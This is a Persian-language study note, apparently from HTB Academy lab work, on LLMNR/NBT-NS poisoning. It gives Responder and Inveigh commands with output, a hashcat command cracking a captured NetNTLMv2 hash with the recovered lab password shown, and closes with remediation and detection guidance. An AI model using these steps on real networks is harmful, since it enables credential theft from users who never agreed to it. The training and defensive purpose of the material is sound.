

[[HTB Active Directory/domain Enumeration/Domain Enumeration|Domain Enumeration]]


### **1️⃣ ابزار Responder چیست؟**


- **Responder**
- یک ابزار **شبکه داخلی (internal network)** برای جمع‌آوری اعتبارنامه‌ها و اجرای حملاتی مثل **LLMNR/NBT-NS/MDNS Poisoning** است.
    
- این ابزار به شما اجازه می‌دهد **ترافیک نام‌گذاری شبکه محلی** را به خودتان هدایت کرده و هش‌های رمز عبور یا اطلاعات ورود کاربران را بدست آورید.
    
- کاربرد اصلی: **شناسایی و جمع‌آوری اطلاعات کاربران در شبکه‌های ویندوزی**.
    

---

### **2️⃣ بررسی دستور: `sudo responder -I ens224 -A`**

| بخش دستور   | معنی                                                                                                                                                                                                      |
| ----------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `sudo`      | اجرای دستور با دسترسی **مدیر (root)**؛ چون Responder نیاز به دسترسی پایین‌به‌بالا به کارت شبکه دارد.                                                                                                      |
| `responder` | فراخوانی ابزار Responder.                                                                                                                                                                                 |
| `-I ens224` | **انتخاب کارت شبکه** که روی آن Responder فعالیت می‌کند. در اینجا `ens224` کارت شبکه شماست.                                                                                                                |
| `-A`        | فعال کردن **SMB/HTTP/FTP/LDAP/SMTP/SQL Capture** و تلاش برای گرفتن **Credential Hashها**. به عبارت دیگر، این سوئیچ باعث می‌شود Responder **تمام حملات LLMNR/NBT-NS را فعال کند** و هش‌ها را جمع‌آوری کند. |



## نکته : کارت شبکه باید روی حالت **promiscuous** مود باشد تا بتواند ترافیک کل شبکه را بگیرد 

```
sudo ifconfig eth0 promisc
```


---

### **3️⃣ چه اتفاقی می‌افتد؟**

1. Responder شروع به **گوش دادن به ترافیک شبکه** روی کارت شبکه `ens224` می‌کند.
    
2. وقتی یک **نام NetBIOS یا LLMNR درخواست شده** در شبکه پیدا شود، Responder **با خودش پاسخ می‌دهد** (Poisoning).
    
3. سیستم‌های دیگر سعی می‌کنند به Responder وصل شوند و **نام کاربری و هش رمز عبور** خود را ارسال می‌کنند.
    
4. Responder این هش‌ها را ذخیره می‌کند و می‌توان از آن‌ها برای **حملات Crack یا Pass-the-Hash** استفاده کرد.
    

---

### **4️⃣ نکات مهم امنیتی و عملیاتی**

- این ابزار **فقط در شبکه داخلی یا محیط تست قانونی** باید استفاده شود. استفاده بدون اجازه **غیرقانونی و جرم است**.
    
- فعال کردن گزینه `-A` **می‌تواند ترافیک شبکه را تحریک کند و توسط سیستم‌های امنیتی شناسایی شود**.
    

---


- **هدف اصلی:**  
    ترکیب **Passive و Active Enumeration** برای شناسایی هاست‌های زنده در شبکه داخلی و ایجاد لیست هدف برای مراحل بعدی.
    
- **نکات کلیدی:**
    
    - **Responder Passive:** شناسایی هاست‌ها و جمع‌آوری اطلاعات بدون تولید ترافیک مشکوک.
        
    - **ICMP Sweep با fping:** تکمیل اطلاعات با بررسی Active Hostها.
        
    - **ویژگی‌های fping:**
        
        - چند هاست همزمان
            
        - قابل اسکریپت شدن
            
        - Round-Robin برای سرعت و کارایی بیشتر
            
    - **ICMP فقط دید اولیه می‌دهد:** نیاز است با بررسی پورت‌ها و پروتکل‌های دیگر تکمیل شود.
        
- **پیامد عملیاتی:**
    
    - ترکیب **Passive و Active** باعث **شناسایی دقیق‌تر و جامع‌تر شبکه** می‌شود.
        
    - ایجاد **لیست هدف قوی برای Enumeration AD و تست نفوذ**.
        
    - ICMP Sweep می‌تواند **هاست‌های جدید و فعال** را شناسایی کند که در Passive Analysis دیده نشده‌اند.


---



معمولاً ما باید **Responder را اجرا کنیم و اجازه دهیم مدتی در یک پنجره tmux فعال بماند** تا در حین انجام سایر وظایف Enumeration، **حداکثر تعداد Hash ممکن را به دست آوریم**.

زمانی که آماده شدیم، می‌توانیم این **Hashها را به Hashcat بدهیم** و با **hash mode 5600**، **NTLMv2 Hashها** که معمولاً با Responder به دست می‌آوریم را کرک کنیم.

- گاهی ممکن است **NTLMv1 یا سایر انواع Hash** به دست بیاوریم و می‌توانیم با مراجعه به **صفحه Example Hashes در Hashcat**، نوع آن‌ها را شناسایی کرده و **حالت مناسب Hashcat** را انتخاب کنیم.
    
- اگر Hash عجیب یا ناشناخته‌ای به دست آمد، این سایت مرجع خوبی برای شناسایی آن است.
    

برای مطالعه عمیق‌تر، ماژول **Cracking Passwords With Hashcat** آموزش می‌دهد که چگونه **انواع مختلف Hash را با Hashcat کرک کنیم**.

وقتی تعداد کافی Hash به دست آمد، باید آن‌ها را **به فرمتی قابل استفاده تبدیل کنیم**.

> Hashهای NetNTLMv2 پس از کرک شدن بسیار مفید هستند، اما نمی‌توان از آن‌ها برای تکنیک‌هایی مانند **Pass-the-Hash** استفاده کرد؛ بنابراین باید **به صورت Offline کرک شوند**.  
> این کار را می‌توان با ابزارهایی مانند **Hashcat و John** انجام داد.

---

### **تحلیل متن:**

1. **هدف اصلی:**  
    جمع‌آوری **NetNTLM Hashها با Responder** و استفاده از آن‌ها برای **شناسایی رمزهای کاربران دامنه**.
    
2. **نکات کلیدی:**
    
    - **Responder + tmux:** اجرای طولانی مدت برای به حداکثر رساندن تعداد Hashها.
        
    - **Hashcat Mode 5600:** مخصوص **NTLMv2 Hashها**.
        
    - **تشخیص انواع Hash:** مراجعه به **صفحه Example Hashes Hashcat** برای حالت مناسب.
        
    - **Offline Cracking:** NetNTLMv2 قابل استفاده در **Pass-the-Hash نیست**، باید **کرک شود**.
        
3. **پیامد عملیاتی:**
    
    - پس از کرک Hashها، می‌توان **Credentialهای واقعی کاربران دامنه** را به دست آورد.
        
    - دسترسی به **حساب‌های دامنه معتبر** مسیر را برای **Enumeration و حملات بعدی** باز می‌کند.
        
    - این مرحله **بنیاد فاز Internal Penetration Test** و دسترسی به شبکه است.
        

---


```
sudo responder -I ens224
```

![[Pasted image 20250909053555.png]]


**Cracking an NTLMv2 Hash With Hashcat**

```
hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt
```

```
hashcat (v6.1.1) starting...
<SNIP>
Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385
FOREND::INLANEFREIGHT:4af70a79938ddf8a:0f85ad1e80baa52d732719dbf62c34cc:01
0100000000000080f519d1432cd80136f3af14556f04780000000002000800490034004600
4e0001001e00570049004e002d0032004e004c005100420057004d00310054005000490004
003400570049004e002d0032004e004c005100420057004d0031005400500049002e004900
340046004e002e004c004f00430041004c00030014004900340046004e002e004c004f0043
0041004c00050014004900340046004e002e004c004f00430041004c000700080080f519d1
432cd80106000400020000000800300030000000000000000000000000300000227f23c33f
457eb40768939489f1d4f76e0e07a337ccfdd45a57d9b612691a800a001000000000000000
000000000000000000000900220063006900660073002f003100370032002e00310036002e
0035002e003200320035000000000000000000:Klmcargo2
Session..........: hashcat
Status...........: Cracked
Hash.Name........: NetNTLMv2
Hash.Target......:
FOREND::INLANEFREIGHT:4af70a79938ddf8a:0f85ad1e80ba...000000
Time.Started.....: Mon Feb 28 15:20:30 2022 (11 secs)
Time.Estimated...: Mon Feb 28 15:20:41 2022 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........: 1086.9 kH/s (2.64ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 10967040/14344385 (76.46%)
Rejected.........: 0/10967040 (0.00%)
Restore.Point....: 10960896/14344385 (76.41%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: L0VEABLE -> Kittikat
Started: Mon Feb 28 15:20:29 2022
Stopped: Mon Feb 28 15:20:42 2022
```


در این مرحله از ارزیابی، ما **یک NetNTLMv2 Hash برای کاربر FOREND به دست آورده و آن را کرک کرده‌ایم**.  
می‌توانیم از این به عنوان **foothold در دامنه** برای شروع **Enumeration بیشتر** استفاده کنیم.

---



**LLMNR/NBT-NS Poisoning – از روی سیستم ویندوز**

حمله **LLMNR & NBT-NS Poisoning** از یک هاست ویندوز نیز ممکن است.  
در بخش قبلی از **Responder** برای گرفتن Hashها استفاده کردیم.  
این بخش به بررسی ابزار **Inveigh** و تلاش برای **گرفتن مجموعه دیگری از Credentialها** می‌پردازد.

---

**Inveigh – مرور کلی**

اگر ما:

- یک هاست ویندوز به عنوان **Attack Box** داشته باشیم، یا
    
- مشتری یک سیستم ویندوز در اختیارمان قرار دهد، یا
    
- با روش دیگری روی یک هاست ویندوز **Local Admin** شویم و بخواهیم دسترسی‌مان را گسترش دهیم،
    

ابزار **Inveigh** شبیه Responder عمل می‌کند، اما:

- با **PowerShell و C# نوشته شده است**
    
- می‌تواند به IPv4 و IPv6 و **چندین پروتکل دیگر** گوش دهد، از جمله:
    
    - **LLMNR, DNS, mDNS, NBNS, DHCPv6, ICMPv6, HTTP, HTTPS, SMB, LDAP, WebDAV, Proxy Auth**
        

این ابزار در مسیر **C:\Tools** روی هاست ویندوز ارائه شده موجود است.

---

برای شروع، می‌توانیم نسخه **PowerShell** را اجرا کنیم و سپس **تمام پارامترهای ممکن** را لیست کنیم.  
یک **Wiki** وجود دارد که تمام پارامترها و دستورالعمل‌های استفاده را توضیح داده است.

---

### **تحلیل متن:**

1. **هدف اصلی:**  
    استفاده از **Inveigh روی هاست ویندوز** برای جمع‌آوری **Credentialهای دامنه یا کاربران شبکه** با تکنیک‌های مشابه Responder.
    
2. **نکات کلیدی:**
    
    - **قابلیت‌ها:** Inveigh علاوه بر LLMNR و NBT-NS، روی پروتکل‌های متعدد دیگر نیز عمل می‌کند.
        
    - **نصب و دسترسی:** ابزار از پیش روی هاست ویندوز ارائه شده و آماده اجراست.
        
    - **PowerShell & C#:** اجازه می‌دهد روی هاست ویندوز به راحتی اجرا شود و پارامترها و رفتار آن قابل تنظیم است.
        
3. **پیامد عملیاتی:**
    
    - می‌توان **از هر هاست ویندوزی برای حمله LLMNR/NBT-NS Poisoning استفاده کرد**.
        
    - این ابزار به ما امکان می‌دهد **Credentialهای بیشتری جمع‌آوری کنیم** و foothold بیشتری در دامنه ایجاد کنیم.
        
    - بررسی دقیق **پارامترها و Wiki ابزار** برای استفاده مؤثر و بدون مشکل حیاتی است.
        

---



```
Import-Module .\Inveigh.ps1
```

```
PS C:\htb> (Get-Command Invoke-Inveigh).Parameters
```

**result**
```
ADIDNSHostsIgnore System.Management.Automation.ParameterMetadata
KerberosHostHeader System.Management.Automation.ParameterMetadata
ProxyIgnore System.Management.Automation.ParameterMetadata
PcapTCP System.Management.Automation.ParameterMetadata
PcapUDP System.Management.Automation.ParameterMetadata
SpooferHostsReply System.Management.Automation.ParameterMetadata
SpooferHostsIgnore System.Management.Automation.ParameterMetadata
SpooferIPsReply System.Management.Automation.ParameterMetadata
SpooferIPsIgnore System.Management.Automation.ParameterMetadata
WPADDirectHosts System.Management.Automation.ParameterMetadata
WPADAuthIgnore System.Management.Automation.ParameterMetadata
ConsoleQueueLimit System.Management.Automation.ParameterMetadata
ConsoleStatus System.Management.Automation.ParameterMetadata
ADIDNSThreshold System.Management.Automation.ParameterMetadata
ADIDNSTTL System.Management.Automation.ParameterMetadata
DNSTTL System.Management.Automation.ParameterMetadata
HTTPPort System.Management.Automation.ParameterMetadata
HTTPSPort System.Management.Automation.ParameterMetadata
KerberosCount System.Management.Automation.ParameterMetadata
LLMNRTTL
```



بیایید **Inveigh را با Spoofing برای LLMNR و NBNS شروع کنیم**،  
و **خروجی را در کنسول نمایش دهیم و همزمان در یک فایل ذخیره کنیم**.  
بقیه تنظیمات را روی **مقدار پیش‌فرض** می‌گذاریم، که می‌توان آن‌ها را در اینجا مشاهده کرد.

```
PS C:\htb> Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```

```
[*] Inveigh 1.506 started at 2022-02-28T19:26:30
[+] Elevated Privilege Mode = Enabled
[+] Primary IP Address = 172.16.5.25
[+] Spoofer IP Address = 172.16.5.25
[+] ADIDNS Spoofer = Disabled
[+] DNS Spoofer = Enabled
[+] DNS TTL = 30 Seconds
[+] LLMNR Spoofer = Enabled
[+] LLMNR TTL = 30 Seconds
[+] mDNS Spoofer = Disabled
[+] NBNS Spoofer For Types 00,20 = Enabled
[+] NBNS TTL = 165 Seconds
[+] SMB Capture = Enabled
[+] HTTP Capture = Enabled
[+] HTTPS Certificate Issuer = Inveigh
[+] HTTPS Certificate CN = localhost
[+] HTTPS Capture = Enabled
[+] HTTP/HTTPS Authentication = NTLM
[+] WPAD Authentication = NTLM
[+] WPAD NTLM Authentication Ignore List = Firefox
[+] WPAD Response = Enabled
[+] Kerberos TGT Capture = Disabled
[+] Machine Account Capture = Disabled
[+] Console Output = Full
[+] File Output = Enabled
[+] Output Directory = C:\Tools
WARNING: [!] Run Stop-Inveigh to stop
[*] Press any key to stop console output
WARNING: [-] [2022-02-28T19:26:31] Error starting HTTP listener
WARNING: [!] [2022-02-28T19:26:31] Exception calling "Start" with "0"
argument(s): "An attempt was made to access a
socket in a way forbidden by its access permissions"
$HTTP_listener.Start()
[+] [2022-02-28T19:26:31] mDNS(QM) request academy-ea-web0.local received
from 172.16.5.125
[+] [2022-02-28T19:26:31] mDNS(QM) request academy-ea-web0.local received
from 172.16.5.125
[+] [2022-02-28T19:26:31] LLMNR request for academy-ea-web0 received from
172.16.5.125
[+] [2022-02-28T19:26:32] mDNS(QM) request academy-ea-web0.local received
from 172.16.5.125
[+] [2022-02-28T19:26:32] mDNS(QM) request academy-ea-web0.local received
from 172.16.5.125
[+] [2022-02-28T19:26:32] LLMNR request for academy-ea-web0 received from
172.16.5.125
[+] [2022-02-28T19:26:32] mDNS(QM) request academy-ea-web0.local received
from 172.16.5.125
[+] [2022-02-28T19:26:32] mDNS(QM) request academy-ea-web0.local received
from 172.16.5.125
[+] [2022-02-28T19:26:32] LLMNR request for academy-ea-web0 received from
172.16.5.125
[+] [2022-02-28T19:26:33] mDNS(QM) request academy-ea-web0.local received
from 172.16.5.125
[+] [2022-02-28T19:26:33] mDNS(QM) request academy-ea-web0.local received
from 172.16.5.125
[+] [2022-02-28T19:26:33] LLMNR request for academy-ea-web0 received from
172.16.5.125
[+] [2022-02-28T19:26:34] TCP(445) SYN packet detected from
172.16.5.125:56834
[+] [2022-02-28T19:26:34] SMB(445) negotiation request detected from
172.16.5.125:56834
[+] [2022-02-28T19:26:34] SMB(445) NTLM challenge 7E3B0E53ADB4AE51 sent to
172.16.5.125:56834
<SNIP>


```



نسخه PowerShell از Inveigh نسخه اصلی است و **دیگر به‌روزرسانی نمی‌شود**.  
نویسنده ابزار **نسخه C# را نگهداری می‌کند** که:

- کد PoC اصلی C# را دارد
    
- و اکثر کدهای نسخه PowerShell را به C# منتقل کرده است.
    

قبل از اینکه بتوانیم از نسخه C# استفاده کنیم، **باید فایل اجرایی (Executable) را Compile کنیم**.


```
.\Inveigh.exe
```

```
[*] Inveigh 2.0.4
[+] Packet Sniffer Addresses[Started 2022-02-28T20:03:28 | PID 6276][IP 172.16.5.25 | IPv6
[+] Listener Addresses
[+] Spoofer Reply Addresses
[+] Spoofer Options
[ ] DHCPv6
[+] DNS Packet Sniffer
[ ] ICMPv6
[+] LLMNR Packet Sniffer
[ ] MDNS
[ ] NBNS
[+] HTTP Listener
[ ] HTTPS
[+] WebDAV
[ ] Proxy
[+] LDAP Listener
[+] SMB Packet Sniffer
[+] File Output
[+] Previous Session Files (Not Found)
[*] Press ESC to enter/exit interactive console
[!] Failed to start HTTP listener on port 80, check IP and port usage.
[!] Failed to start HTTPv6 listener on port 80, check IP and port usage.
[ ] [20:03:31] mDNS(QM)(A) request from
172.16.5.125
[ ] [20:03:31] mDNS(QM)(AAAA) request from
172.16.5.125
[ ] [20:03:31] mDNS(QM)(A) request from
fe80::f098:4f63:8384:d1d0%8
[ ] [20:03:31] mDNS(QM)(AAAA) request from
fe80::f098:4f63:8384:d1d0%8
[+] [20:03:31] LLMNR(A) request from 172.16.5.125
[-] [20:03:31] LLMNR(AAAA) request from 172.16.5.125
[+] [20:03:31] LLMNR(A) request from
fe80::f098:4f63:8384:d1d0%8
[-] [20:03:31] LLMNR(AAAA) request from
fe80::f098:4f63:8384:d1d0%8
[ ] [20:03:32] mDNS(QM)(A) request from
172.16.5.125
[ ] [20:03:32] mDNS(QM)(AAAA) request from
172.16.5.125
[ ] [20:03:32] mDNS(QM)(A) request from
fe80::f098:4f63:8384:d1d0%8
[ ] [20:03:32] mDNS(QM)(AAAA) request from
fe80::f098:4f63:8384:d1d0%8
[+] [20:03:32] LLMNR(A) request from 172.16.5.125
[-] [20:03:32] LLMNR(AAAA) request from 172.16.5.125fe80::dcec:2831:712b:c9a3%8][IP 0.0.0.0 | IPv6 ::][IP 172.16.5.25 | IPv6
fe80::dcec:2831:712b:c9a3%8][Repeat Enabled | Local Attacks Disabled][Type A][Type A][HTTPAuth NTLM | WPADAuth NTLM | Port 80][WebDAVAuth NTLM][Port 389][Port 445][C:\Tools][academy-ea-web0.local][disabled][academy-ea-web0.local][disabled][academy-ea-web0.local][disabled][academy-ea-web0.local][disabled][academy-ea-web0][response sent][academy-ea-web0][type ignored][academy-ea-web0][response sent][academy-ea-web0][type ignored][academy-ea-web0.local][disabled][academy-ea-web0.local][disabled][academy-ea-web0.local][disabled][academy-ea-web0.local][disabled][academy-ea-web0][response sent][academy-ea-web0][type ignored]
```


همان‌طور که می‌بینیم، ابزار اجرا می‌شود و نشان می‌دهد **کدام گزینه‌ها به‌صورت پیش‌فرض فعال هستند و کدام غیر فعال**.

- گزینه‌هایی که **[+]** دارند، **فعال و پیش‌فرض هستند**.
    
- گزینه‌هایی که **[ ]** دارند، **غیرفعال هستند** و اجرا نمی‌شوند.
    

خروجی کنسول در حال اجرا نیز نشان می‌دهد **کدام گزینه‌ها غیرفعال هستند** و بنابراین **پاسخ‌ها ارسال نمی‌شوند** (مثل mDNS در مثال بالا).

همچنین پیام **Press ESC to enter/exit interactive console** نمایش داده می‌شود که هنگام اجرای ابزار **بسیار مفید است**.

کنسول به ما اجازه می‌دهد:

- به **Credentialها/Hashهای جمع‌آوری شده دسترسی داشته باشیم**
    
- ابزار را **متوقف کنیم**
    
- و عملیات دیگری انجام دهیم.
    

می‌توانیم **کلید ESC را بزنیم تا وارد کنسول تعاملی شویم** در حالی که Inveigh در حال اجراست.




**اصلاح و پیشگیری (Remediation)**

**Mitre ATT&CK** این تکنیک را با شناسه **T1557.001** فهرست کرده است:  
**Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning و SMB Relay**.

راه‌های مختلفی برای کاهش اثر این حمله وجود دارد:

- برای اطمینان از اینکه این حملات Spoofing امکان‌پذیر نباشند، می‌توانیم **LLMNR و NBT-NS را غیرفعال کنیم**.
    
- به عنوان یک نکته احتیاطی، **تغییرات مهم در محیط شبکه باید به آرامی و با آزمایش دقیق انجام شود** قبل از اینکه به صورت کامل اجرا شوند.
    
- به عنوان **penetration tester** می‌توانیم این مراحل پیشگیری را پیشنهاد کنیم، اما باید **به وضوح به مشتری اطلاع دهیم که این تغییرات باید به خوبی تست شوند** تا مطمئن شویم غیرفعال کردن هر دو پروتکل، **شبکه را مختل نمی‌کند**.
    

برای غیرفعال کردن LLMNR در **Group Policy** می‌توانیم به مسیر زیر برویم:



---



**تشخیص (Detection)**

غیرفعال کردن **LLMNR و NetBIOS** همیشه ممکن نیست، بنابراین باید راه‌هایی برای **تشخیص این نوع حملات** داشته باشیم.

- **یک روش:** استفاده از حمله علیه حمله‌کننده‌ها، یعنی ارسال **درخواست‌های LLMNR و NBT-NS به نام‌های غیرواقعی روی ساب‌نت‌های مختلف** و ایجاد هشدار در صورت دریافت پاسخ. این نشان‌دهنده **spoofing پاسخ‌های Name Resolution توسط حمله‌کننده** است.
    
- علاوه بر این، می‌توان **میزبان‌ها را برای ترافیک روی پورت‌های UDP 5355 و 137** مانیتور کرد.
    
- همچنین **Event IDهای 4697 و 7045** قابل مانیتورینگ هستند.
    
- در نهایت، می‌توان کلید رجیستری زیر را مانیتور کرد:
    

```
HKLM\Software\Policies\Microsoft\Windows NT\DNSClient
```

و تغییر مقدار **EnableMulticast DWORD** را بررسی کرد.

- مقدار **0** یعنی **LLMNR غیرفعال شده است**.
    

---


- وقتی یک سیستم می‌خواهد **نام یک هاست (Host Name) را به IP تبدیل کند**، از چند روش مختلف استفاده می‌کند:
    
    1. **DNS (Domain Name System)** – روش استاندارد و امن
        
    2. **LLMNR (Link-Local Multicast Name Resolution)** – پروتکل مایکروسافت برای شبکه‌های محلی، وقتی DNS جواب ندهد
        
    3. **NBT-NS (NetBIOS Name Service)** – پروتکل قدیمی برای رزولوشن نام‌ها در شبکه‌های ویندوزی
        
    4. **mDNS (Multicast DNS)** – بیشتر در شبکه‌های محلی و دستگاه‌های اپل و IoT
        
- مشکل وقتی پیش می‌آید که **حمله‌کننده در شبکه داخلی حضور دارد**. او می‌تواند با **spoofing پاسخ‌ها**، Credentialها یا Hashهای NTLM کاربران را جمع‌آوری کند. این همان چیزی است که LLMNR/NBT-NS Poisoning نامیده می‌شود.


**غیرفعال کردن LLMNR و NBT-NS روی سیستم‌ها:**

- کاربران دیگر نمی‌توانند از این پروتکل‌ها برای رزولوشن نام‌ها استفاده کنند.
    
- سیستم به جای آن فقط از **DNS رسمی** استفاده می‌کند.
    
- این باعث می‌شود **حملات Poisoning** غیرممکن یا بسیار سخت شو




---

### 1️⃣ نحوه کار Responder

- **Responder** یک ابزار **Poisoner/Listener** در شبکه محلی (LAN) هست.
    
- وقتی اجرا می‌کنیش، چند سرویس روی شبکه گوش می‌کنه:
    
    - LLMNR (Link-Local Multicast Name Resolution)
        
    - NBT-NS (NetBIOS Name Service)
        
    - MDNS و بعضی پروتکل‌های دیگر
        
- هدفش اینه که **درخواست‌های نام شبکه (hostname lookups) را رهگیری کنه** و پاسخ خودش را بده.
    

مثال:

1. سیستم هدف می‌خواد اسم `FILESERVER` را resolve کنه.
    
2. سیستم خودش multicast می‌فرسته: “Who has FILESERVER?”
    
3. Responder این درخواست را می‌بیند و **خودش جواب می‌دهد** (fake reply) → تمام ترافیک سمت خودش میاد.
    

---

### 2️⃣ چرا همه ترافیک میاد طرف Responder؟

- وقتی Responder جواب می‌دهد، سیستم هدف فکر می‌کنه اون **سرور مورد نظر** هست.
    
- در نتیجه:
    
    - یوزرنیم‌ها و هش‌های NTLM یا Kerberos (در بعضی موارد) برای authentication به Responder فرستاده می‌شوند.
        
    - اگر تو حالت **SMB/HTTP/LDAP challenge-response** باشه، هش‌ها یا login attempt ها capture می‌شوند.
        
- این دقیقاً کاریه که ابزار برای **جمع‌آوری credential hashes یا poisoning** انجام می‌دهد.
    

---

### 3️⃣ نکات مهم امنیتی

- تمام این ترافیک **در شبکه LAN محلی** است، اینترنت رو شامل نمی‌شود.
    
- برای اینکه ببینی واقعاً چه داده‌ای capture شده:
    
    - گزینه `-v` یا `--verbose` در Responder
        
    - فایل log که hashes و usernames را ذخیره می‌کند.
        
- مراقب باش: این روش روی شبکه‌ی خودت یا شبکه مجاز باشه؛ در شبکه‌های دیگر **غیرقانونی و جرم محسوب می‌شود**.
    

---

### 4️⃣ جمع‌بندی

- بله، وقتی Responder اجرا شد و multicast name request ارسال شد → همه‌ی ترافیک مربوط به این نام‌ها که هدف به دنبال آن‌هاست، می‌آید سمت تو.
    
- این شامل:
    
    - درخواست‌های LLMNR و NBT-NS
        
    - authentication attempt ها (hash ها)
        
- اساساً **Responder خودش را به جای مقصد واقعی جا می‌زند** و ترافیک به سمت خودش می‌آید.
    

---

اگر بخوای، می‌تونم یک **نمودار سادهٔ جریان ترافیک Responder** بکشم که خیلی واضح نشون بده وقتی یک کلاینت اسم رو resolve می‌کنه، چطور ترافیک سمت Responder میاد و credential ها capture می‌شوند.

میخوای برات بکشم؟